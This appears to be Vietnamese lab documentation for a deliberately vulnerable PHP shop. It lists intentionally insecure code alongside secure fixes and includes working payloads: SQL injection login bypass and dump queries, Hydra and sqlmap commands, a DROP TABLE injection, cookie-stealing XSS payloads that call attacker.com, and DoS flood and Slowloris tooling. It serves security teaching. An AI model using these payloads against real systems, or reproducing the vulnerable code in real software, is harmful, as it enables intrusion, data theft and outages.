# 🔓 Danh Sách Lỗ Hổng Bảo Mật (Vulnerabilities)

> **Mục đích**: Tài liệu này mô tả chi tiết 6 lỗ hổng bảo mật chính được tích hợp trong website Vulnerable Shop để phục vụ mục đích học tập và nghiên cứu về An toàn Thông tin.

## 📋 Tổng Quan 6 Lỗ Hổng Chính

| # | Chức năng | Lỗ hổng | Mức độ | File |
|---|-----------|---------|--------|------|
| 1 | Đăng ký - Đăng nhập | Brute Force, SQL Injection, Plaintext Password | 🔴 Critical | `login.php`, `register.php` |
| 2 | Tìm kiếm sản phẩm | SQL Injection | 🔴 Critical | `products.php` |
| 3 | Quản lý đơn hàng | IDOR (Insecure Direct Object Reference) | 🟠 High | `order_detail.php` |
| 4 | Quản lý sản phẩm | Data Validation Issues | 🟡 Medium | `admin/products_manage.php` |
| 5 | Đánh giá sản phẩm | Stored XSS, User Enumeration | 🔴 Critical | `product_detail.php` |
| 6 | Toàn hệ thống | Denial of Service (DoS) | 🟠 High | `products.php`, `dos_test.php` |

---

## 🔐 1. LỖ HỔNG ĐĂNG KÝ - ĐĂNG NHẬP

### 📌 Tổng Quan
**Chức năng**: Đăng ký tài khoản mới và đăng nhập vào hệ thống  
**Files liên quan**: `login.php`, `register.php`, `config.php`  
**Bảng database**: `users`

### 🚨 Rủi Ro A: Brute Force Attack
**Mức độ**: 🟠 High  
**Vị trí**: `login.php` (form đăng nhập)

#### Mô tả lỗ hổng:
- ❌ Không có giới hạn số lần đăng nhập sai (No Rate Limiting)
- ❌ Không có CAPTCHA hoặc reCAPTCHA
- ❌ Không có cơ chế khóa tài khoản sau N lần sai
- ❌ Không có delay giữa các lần thử

#### Kịch bản tấn công:
```
1. Attacker xác định được username hợp lệ (ví dụ: admin)
2. Sử dụng tool tự động để thử hàng nghìn mật khẩu
3. Không bị chặn hoặc làm chậm
4. Cuối cùng tìm được mật khẩu đúng
```

#### Demo khai thác với Burp Suite:
```
1. Mở Burp Suite → Proxy → Intercept
2. Đăng nhập với bất kỳ password nào, bắt request
3. Send to Intruder
4. Chọn password field làm payload position
5. Load wordlist: rockyou.txt (top 1000)
6. Attack type: Sniper
7. Start Attack
8. Tìm response có length khác biệt (đăng nhập thành công)
```

#### Demo khai thác với Hydra:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/vulnerable-shop/login.php:username=^USER^&password=^PASS^:Invalid username or password"
```

#### Impact:
- ✅ Chiếm quyền tài khoản người dùng
- ✅ Chiếm quyền admin nếu tìm được password
- ✅ Truy cập thông tin cá nhân, lịch sử mua hàng

---

### 🚨 Rủi Ro B: SQL Injection trong Login Form
**Mức độ**: 🔴 Critical  
**Vị trí**: `login.php` (line ~30-40)

#### Code dễ bị tấn công:
```php
$username = $_POST['username'];
$password = $_POST['password'];
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $sql);
```

#### Payloads bypass authentication:
```sql
# Payload 1: OR-based injection
Username: admin' OR '1'='1' --
Password: anything

# Payload 2: Comment-based injection  
Username: admin'#
Password: (không cần)

# Payload 3: UNION-based
Username: ' UNION SELECT 1,2,3,4,5,6,7,'admin',8 --
Password: (không cần)
```

#### Giải thích:
- Query sẽ trở thành: `SELECT * FROM users WHERE username='admin' OR '1'='1' -- ' AND password='...'`
- Phần `OR '1'='1'` luôn đúng → Bypass authentication
- Dấu `--` comment phần còn lại của query

#### Impact:
- ✅ Bypass đăng nhập hoàn toàn
- ✅ Đăng nhập với quyền admin mà không cần mật khẩu
- ✅ Dump toàn bộ database

---

### 🚨 Rủi Ro C: Plaintext Password Storage
**Mức độ**: 🔴 Critical  
**Vị trí**: Database `users` table, `register.php`

#### Code dễ bị tấn công:
```php
// register.php
$password = $_POST['password']; // Lưu trực tiếp không mã hóa!
$sql = "INSERT INTO users (username, password, email) VALUES ('$username', '$password', '$email')";
```

#### Database schema:
```sql
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL,
    password VARCHAR(255) NOT NULL  -- ⚠️ Lưu plaintext!
);

-- Ví dụ dữ liệu:
INSERT INTO users VALUES (1, 'admin', 'admin123', ...);  -- ⚠️ Plaintext!
```

#### Kịch bản tấn công:
```
1. Attacker khai thác SQL Injection ở chức năng tìm kiếm
2. Dump bảng users: username + password
3. Có ngay password plaintext của tất cả users
4. Sử dụng password để đăng nhập hợp pháp
```

#### Impact:
- ✅ Một khi database bị leak → tất cả password bị lộ
- ✅ User dùng cùng password trên nhiều site → bị tấn công credential stuffing
- ✅ Vi phạm GDPR và các quy định bảo mật dữ liệu

#### Cách khắc phục:
```php
// register.php - SECURE VERSION
$password = password_hash($_POST['password'], PASSWORD_BCRYPT);
$sql = "INSERT INTO users (username, password, email) VALUES (?, ?, ?)";

// login.php - SECURE VERSION
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
$user = $result->fetch_assoc();
if ($user && password_verify($_POST['password'], $user['password'])) {
    // Login success
}
```

---

## 🔍 2. LỖ HỔNG TÌM KIẾM SẢN PHẨM

### 📌 Tổng Quan
**Chức năng**: Xem danh sách và tìm kiếm sản phẩm theo tên/mô tả  
**File liên quan**: `products.php`  
**Bảng database**: `products`, `users` (có thể dump)

### 🚨 Rủi Ro: UNION-based SQL Injection
**Mức độ**: 🔴 Critical  
**Vị trí**: `products.php` (tham số GET `search`)

#### Code dễ bị tấn công:
```php
// products.php (line ~20-30)
$search = $_GET['search'];
$sql = "SELECT * FROM products WHERE name LIKE '%$search%' OR description LIKE '%$search%'";
$result = mysqli_query($conn, $sql);
```

#### Vấn đề:
- ❌ Input `$search` không được sanitize
- ❌ Không sử dụng Prepared Statements
- ❌ Concatenation trực tiếp vào SQL query

#### Các kiểu tấn công:

**1. Information Gathering (Kiểm tra số cột):**
```sql
# URL: products.php?search=' ORDER BY 1--
# Tăng dần: ORDER BY 2--, ORDER BY 3--, ... 
# Đến khi lỗi → biết được số cột
```

**2. Dump Users Table (Hiển thị trên giao diện):**
```sql
# URL encode payload sau:
%' UNION SELECT id,CONCAT('🔓 User: ',username),CONCAT('🔑 Pass: ',password),0,0,'leaked-data',email,phone,created_at FROM users#

# Giải thích:
# - Map 9 cột users sang 9 cột products
# - CONCAT để format đẹp hơn
# - Hiển thị ngay trên card sản phẩm
```

**3. Dump Database Schema:**
```sql
' UNION SELECT 1,table_name,column_name,4,5,6,7,8,9 FROM information_schema.columns WHERE table_schema=database()#
```

**4. Dump All Tables:**
```sql
' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7,8,9 FROM information_schema.tables WHERE table_schema=database()#
```

**5. Exfiltrate Sensitive Data:**
```sql
' UNION SELECT id,full_name,CONCAT('Email: ',email,' | Phone: ',phone),0,0,'customer-data',address,role,created_at FROM users WHERE role='admin'#
```

#### Demo bằng SQLMap:
```bash
# Tự động khai thác
sqlmap -u "http://localhost/vulnerable-shop/products.php?search=test" --dbs

# Dump users table
sqlmap -u "http://localhost/vulnerable-shop/products.php?search=test" -D shop_db -T users --dump

# Dump all
sqlmap -u "http://localhost/vulnerable-shop/products.php?search=test" --dump-all
```

#### Impact:
- ✅ Lộ toàn bộ dữ liệu database (users, orders, products)
- ✅ Lộ mật khẩu plaintext của tất cả users
- ✅ Lộ cấu trúc database → dễ tấn công tiếp
- ✅ Có thể chèn/sửa/xóa dữ liệu (nếu có quyền)

#### Cách khắc phục:
```php
// SECURE VERSION
$search = $_GET['search'];
$sql = "SELECT * FROM products WHERE name LIKE ? OR description LIKE ?";
$stmt = $conn->prepare($sql);
$searchParam = "%$search%";
$stmt->bind_param("ss", $searchParam, $searchParam);
$stmt->execute();
$result = $stmt->get_result();
```

---

## 📦 3. LỖ HỔNG QUẢN LÝ ĐỠN HÀNG

### 📌 Tổng Quan
**Chức năng**: Xem chi tiết đơn hàng của người dùng  
**File liên quan**: `order_detail.php`, `orders.php`  
**Bảng database**: `orders`, `order_items`

### 🚨 Rủi Ro: IDOR (Insecure Direct Object Reference)
**Mức độ**: 🟠 High  
**Vị trí**: `order_detail.php` (tham số GET `id`)

#### Code dễ bị tấn công:
```php
// order_detail.php (line ~10-20)
$order_id = $_GET['id'];
$sql = "SELECT * FROM orders WHERE id = $order_id";
$result = mysqli_query($conn, $sql);

// ⚠️ KHÔNG KIỂM TRA: order có thuộc về user hiện tại không?
```

#### Kịch bản tấn công:

**Bước 1**: Đăng nhập với User A (id=2)
```
- User A có đơn hàng: id=1, id=2
- URL hợp lệ: order_detail.php?id=1
```

**Bước 2**: Thay đổi parameter `id`
```
- Thử: order_detail.php?id=3
- Thử: order_detail.php?id=4
- Thử: order_detail.php?id=5
```

**Bước 3**: Xem được đơn hàng của User B
```
✅ Thông tin bị lộ:
- Địa chỉ giao hàng
- Số điện thoại
- Sản phẩm đã mua
- Tổng tiền
- Trạng thái đơn hàng
```

#### Demo tự động bằng Burp Suite Intruder:
```
1. Bắt request: GET /order_detail.php?id=1
2. Send to Intruder
3. Payload position: id=§1§
4. Payload type: Numbers (1-100)
5. Attack → xem tất cả đơn hàng trong hệ thống
```

#### Impact:
- ✅ Vi phạm quyền riêng tư khách hàng
- ✅ Lộ thông tin cá nhân (địa chỉ, phone)
- ✅ Lộ thói quen mua hàng
- ✅ Có thể sử dụng để tấn công social engineering

#### Cách khắc phục:
```php
// SECURE VERSION
session_start();
$order_id = intval($_GET['id']); // Sanitize input
$user_id = $_SESSION['user_id'];

// Check ownership
$sql = "SELECT * FROM orders WHERE id = ? AND user_id = ?";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ii", $order_id, $user_id);
$stmt->execute();
$result = $stmt->get_result();

if ($result->num_rows == 0) {
    die("Access denied! This order does not belong to you.");
}
```

---

## 🛠️ 4. LỖ HỔNG QUẢN LÝ SẢN PHẨM

### 📌 Tổng Quan
**Chức năng**: Thêm/sửa/xóa sản phẩm (Admin)  
**File liên quan**: `admin/products_manage.php`  
**Bảng database**: `products`

### 🚨 Rủi Ro: Data Validation & Integrity Issues
**Mức độ**: 🟡 Medium  
**Vị trí**: Form thêm/sửa sản phẩm

#### Code dễ bị tấn công:
```php
// admin/products_manage.php
$name = $_POST['name'];
$price = $_POST['price'];      // ⚠️ Không validate
$stock = $_POST['stock'];      // ⚠️ Không validate
$description = $_POST['description']; // ⚠️ Không sanitize

$sql = "INSERT INTO products (name, description, price, stock) 
        VALUES ('$name', '$description', $price, $stock)";
```

#### Các vấn đề cụ thể:

**A. Giá âm (Negative Price):**
```
Input: price = -1000000
Result: Sản phẩm giá -1 triệu
Impact: Khách hàng mua → Được trả tiền!
```

**B. Tồn kho âm (Negative Stock):**
```
Input: stock = -999
Result: Hiển thị "Còn hàng" nhưng không bán được
Impact: Khách đặt hàng → không giao được → khiếu nại
```

**C. Giá quá cao (Overflow/Human Error):**
```
Input: price = 999999999999
Result: Overflow hoặc giá không hợp lý
Impact: Khách hàng nhầm lẫn, mất niềm tin
```

**D. Mô tả chứa HTML/Script (XSS):**
```
Input: description = "<script>alert('XSS')</script>"
Result: Lưu vào DB
Impact: XSS khi hiển thị trên product_detail.php
```

**E. Tên sản phẩm không hợp lệ:**
```
Input: name = "" (empty)
Input: name = "  " (whitespace)
Result: Sản phẩm không có tên
Impact: Giao diện lỗi, khó quản lý
```

**F. SQL Injection trong admin panel:**
```
Input: name = "'; DROP TABLE products; --"
Result: Có thể xóa toàn bộ bảng sản phẩm
```

#### Kịch bản tấn công:

**Scenario 1: Tạo sản phẩm "miễn phí"**
```
1. Admin (hoặc attacker chiếm quyền admin)
2. Thêm sản phẩm: iPhone 15 Pro Max, giá = 0
3. User mua → Checkout → Tổng tiền = 0
4. Thiệt hại tài chính cho doanh nghiệp
```

**Scenario 2: DoS bằng số liệu cực lớn**
```
1. Nhập: stock = 2147483647 (MAX_INT)
2. Nhập: price = 99999999999.99
3. Gây overflow, crash database hoặc application
```

**Scenario 3: XSS Stored thông qua mô tả**
```
1. Thêm sản phẩm với description:
   <img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">
2. Mọi user xem sản phẩm → Cookie bị đánh cắp
```

#### Impact:
- ✅ Thiệt hại tài chính (giá âm, giá 0)
- ✅ Mất uy tín (thông tin sai lệch)
- ✅ Khiếu nại, trả hàng hàng loạt
- ✅ XSS → Chiếm quyền admin khác
- ✅ SQL Injection → Xóa toàn bộ dữ liệu

#### Cách khắc phục:
```php
// SECURE VERSION
$name = trim($_POST['name']);
$price = floatval($_POST['price']);
$stock = intval($_POST['stock']);
$description = htmlspecialchars($_POST['description'], ENT_QUOTES, 'UTF-8');

// Validation
if (empty($name)) {
    die("Tên sản phẩm không được để trống!");
}
if ($price < 0) {
    die("Giá không được âm!");
}
if ($price > 999999999) {
    die("Giá không hợp lệ!");
}
if ($stock < 0) {
    die("Tồn kho không được âm!");
}

// Use prepared statement
$sql = "INSERT INTO products (name, description, price, stock) VALUES (?, ?, ?, ?)";
$stmt = $conn->prepare($sql);
$stmt->bind_param("ssdi", $name, $description, $price, $stock);
$stmt->execute();
```

---

## ⚡ 5. LỖ HỔNG DENIAL OF SERVICE (DoS)

### 📌 Tổng Quan
**Chức năng**: Các endpoint xử lý dữ liệu lớn hoặc thuật toán phức tạp  
**Files liên quan**: `products.php`, `dos_test.php`

### 🚨 Rủi Ro A: Resource Exhaustion (Cạn kiệt tài nguyên)
**Mức độ**: 🟠 High  
**Vị trí**: `products.php` (tham số `limit`)

#### Mô tả:
- ❌ Không giới hạn giá trị của tham số `limit`.
- ❌ Kẻ tấn công có thể yêu cầu hàng triệu bản ghi trong một request, làm treo Database hoặc tràn bộ nhớ PHP.

#### Khai thác:
```bash
# Yêu cầu 1 triệu sản phẩm
curl "http://localhost/vulnerable-shop/products.php?limit=1000000"
```

### 🚨 Rủi Ro B: ReDoS (Regular Expression DoS)
**Mức độ**: 🟠 High  
**Vị trí**: `dos_test.php`

#### Mô tả:
- ❌ Sử dụng Regex không tối ưu (Evil Regex) gây ra hiện tượng Catastrophic Backtracking.
- ❌ Một chuỗi đầu vào nhỏ có thể khiến CPU server tăng vọt lên 100% và treo process.

#### Khai thác:
```bash
# Gửi pattern gây backtracking
curl "http://localhost/vulnerable-shop/dos_test.php?type=redos&pattern=(a+)+$"
```

---

## 🛠️ CÔNG CỤ KIỂM THỬ DoS (dos_tool.js)

Chúng tôi đã cung cấp một công cụ Node.js để tự động hóa việc kiểm thử các lỗ hổng DoS này.

### Cách sử dụng:
1. Đảm bảo đã cài đặt Node.js.
2. Chạy lệnh:
```bash
# Xem hướng dẫn
node dos_tool.js help

# Test Resource Exhaustion
node dos_tool.js limit http://localhost/vulnerable-shop

# Test ReDoS
node dos_tool.js redos http://localhost/vulnerable-shop

# Test HTTP Flood (500 requests đồng thời)
node dos_tool.js flood http://localhost/vulnerable-shop

# Test Slowloris (Làm cạn kiệt connection pool của Apache)
node dos_tool.js slowloris http://localhost/vulnerable-shop
```

---

## 📊 Bảng Tổng Hợp Cách Khắc Phục

| Lỗ hổng | Giải pháp chính | Công nghệ/Kỹ thuật |
|---------|-----------------|-------------------|
| **Brute Force** | Rate Limiting + CAPTCHA | reCAPTCHA, Account Lockout, JWT with expiry |
| **SQL Injection** | Prepared Statements | PDO, MySQLi `bind_param()` |
| **Plaintext Password** | Hash mật khẩu | `password_hash()`, bcrypt, Argon2 |
| **IDOR** | Authorization Check | Session-based ownership validation |
| **Data Validation** | Input Validation + Sanitization | `filter_var()`, `htmlspecialchars()`, Regex |
| **DoS** | Rate Limiting + Input Limits | Cloudflare, `limit` validation, Regex optimization |

---

## 💬 5. LỖ HỔNG ĐÁNH GIÁ SẢN PHẨM

### 📌 Tổng Quan
**Chức năng**: Người dùng gửi nhận xét và đánh giá sao cho sản phẩm.  
**Files liên quan**: `product_detail.php`  
**Bảng database**: `reviews`

### 🚨 Rủi Ro A: Stored Cross-Site Scripting (XSS)
**Mức độ**: 🔴 Critical  
**Vị trí**: `product_detail.php` (phần hiển thị comment)

#### Mô tả lỗ hổng:
- ❌ Dữ liệu từ người dùng (`comment`) được lưu vào database mà không qua kiểm duyệt.
- ❌ Khi hiển thị, dữ liệu được in trực tiếp ra HTML mà không dùng `htmlspecialchars()`.

#### Kịch bản tấn công:
```html
1. Attacker đăng nhập và gửi đánh giá với nội dung:
   <script>alert('XSS!'); fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>
2. Bất kỳ người dùng nào (kể cả Admin) vào xem sản phẩm đó sẽ bị thực thi mã script.
3. Attacker lấy được Session Cookie và chiếm quyền tài khoản.
```

### 🚨 Rủi Ro B: User Enumeration
**Mức độ**: 🟡 Medium  
**Vị trí**: `product_detail.php` (phần hiển thị tên người đánh giá)

#### Mô tả lỗ hổng:
- ❌ Hiển thị trực tiếp `username` (thường là ID đăng nhập) của người đánh giá.
- ❌ Giúp attacker thu thập danh sách các username hợp lệ để thực hiện Brute Force.

#### Impact:
- ✅ Lộ thông tin định danh người dùng.
- ✅ Tạo tiền đề cho các cuộc tấn công dò tìm mật khẩu.

---

## 🎯 Lab Exercises (Bài Tập Thực Hành)

### Exercise 1: Khai thác SQL Injection
```
Task: Sử dụng SQL Injection ở products.php để:
1. Dump tất cả username và password
2. Tìm email của admin
3. Đếm số lượng users trong hệ thống
4. Lấy thông tin đơn hàng có giá trị cao nhất
```

### Exercise 2: Khai thác IDOR
```
Task: 
1. Tạo 2 tài khoản user
2. Đặt hàng với user1
3. Đăng nhập user2 và xem đơn hàng của user1
4. Document lại thông tin bị lộ
```

### Exercise 3: Brute Force
```
Task: Sử dụng Burp Suite Intruder để:
1. Brute force password của user 'admin'
2. Wordlist: top 100 common passwords
3. Ghi lại số request cần thiết để thành công
```

### Exercise 4: Fix Vulnerabilities
```
Task: Fork project và khắc phục:
1. Fix SQL Injection trong products.php
2. Implement password hashing trong register.php
3. Add IDOR protection trong order_detail.php
4. Add input validation trong admin/products_manage.php
```

### Exercise 5: Denial of Service (DoS)
```
Task: 
1. Sử dụng dos_tool.js để test endpoint products.php?limit=...
2. Quan sát thời gian phản hồi khi tăng limit.
3. Sử dụng dos_tool.js để test ReDoS.
4. Đề xuất cách fix cho lỗ hổng limit trong products.php.
```

---

## ⚠️ DISCLAIMER & LEGAL NOTICE

### 🚨 Lưu Ý Quan Trọng:

1. **Chỉ sử dụng trong môi trường LAB**: Localhost, máy ảo, hoặc môi trường kiểm soát
2. **KHÔNG triển khai lên Internet**: Website này KHÔNG an toàn cho production
3. **KHÔNG tấn công website thực**: Vi phạm pháp luật, có thể bị truy cứu hình sự
4. **Mục đích học tập**: Chỉ để hiểu về security, không để làm điều xấu

### 📜 Trách Nhiệm Pháp Lý:

- Tác giả KHÔNG chịu trách nhiệm về bất kỳ hành vi vi phạm pháp luật nào
- Người sử dụng phải tuân thủ luật pháp địa phương
- Việc sử dụng các kỹ thuật này trên hệ thống không được phép là **BẤT HỢP PHÁP**

### ✅ Sử Dụng Hợp Pháp:

- ✅ Học tập cá nhân trên localhost
- ✅ Giảng dạy trong trường học/khóa học
- ✅ Security research với sự cho phép
- ✅ Bug bounty programs (nếu có)
- ✅ Penetration testing với hợp đồng hợp pháp

---

**Happy Ethical Hacking! 🎓🔐**

*Last updated: 2025-12-07*
